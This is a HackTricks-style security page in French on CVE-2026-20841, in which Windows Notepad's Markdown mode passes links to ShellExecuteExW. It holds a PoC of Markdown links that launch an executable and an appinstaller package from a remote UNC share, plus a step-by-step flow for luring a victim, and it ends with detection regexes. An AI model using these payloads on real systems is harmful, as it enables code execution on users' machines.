# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Les applications Windows modernes qui rendent Markdown/HTML transforment souvent les liens fournis par l'utilisateur en éléments cliquables et les passent à `ShellExecuteExW`. Sans une strict scheme allowlisting, tout registered protocol handler (p.ex. `file:`, `ms-appinstaller:`) peut être déclenché, entraînant l'exécution de code dans le contexte de l'utilisateur courant.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad choisit le mode Markdown **uniquement pour les extensions `.md`** via une comparaison de chaînes fixe dans `sub_1400ED5D0()`.
- Liens Markdown supportés :
- Standard : `[text](target)`
- Autolink : `<target>` (rendu comme `[target](target)`), donc les deux syntaxes importent pour les payloads et les détections.
- Les clics sur les liens sont traités dans `sub_140170F60()`, qui applique un filtrage faible puis appelle `ShellExecuteExW`.
- `ShellExecuteExW` délègue vers **tout configured protocol handler**, pas seulement HTTP(S).

### Payload considerations
- Toutes les séquences `\\` dans le lien sont **normalisées en `\`** avant `ShellExecuteExW`, ce qui impacte le crafting de UNC/path et la détection.
- Les fichiers `.md` **ne sont pas associés à Notepad par défaut** ; la victime doit encore ouvrir le fichier dans Notepad et cliquer sur le lien, mais une fois rendu, le lien est cliquable.
- Exemples de schemes dangereux :
- `file://` pour lancer un payload local/UNC.
- `ms-appinstaller://` pour déclencher les flows d'App Installer. D'autres schemes enregistrés localement peuvent également être abusables.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flux d'exploitation
1. Créez un fichier **`.md`** pour que Notepad l'affiche en Markdown.
2. Insérez un lien utilisant un schéma d'URI dangereux (`file:`, `ms-appinstaller:`, ou tout handler installé).
3. Transférez le fichier (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ou similaire) et convainquez l'utilisateur de l'ouvrir dans Notepad.
4. Au clic, le **lien normalisé** est passé à `ShellExecuteExW` et le handler de protocole correspondant exécute le contenu référencé dans le contexte de l'utilisateur.

## Idées de détection
- Surveillez les transferts de fichiers `.md` sur les ports/protocoles qui livrent couramment des documents : `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analysez les liens Markdown (standard et autolink) et recherchez `file:` ou `ms-appinstaller:` de manière **insensible à la casse**.
- Vendor-guided regexes to catch remote resource access:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Le comportement du Patch rapporté **allowlists local files and HTTP(S)** ; tout autre élément atteignant `ShellExecuteExW` est suspect. Étendez les détections aux autres gestionnaires de protocoles installés selon les besoins, puisque la surface d'attaque varie selon le système.

## Références
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
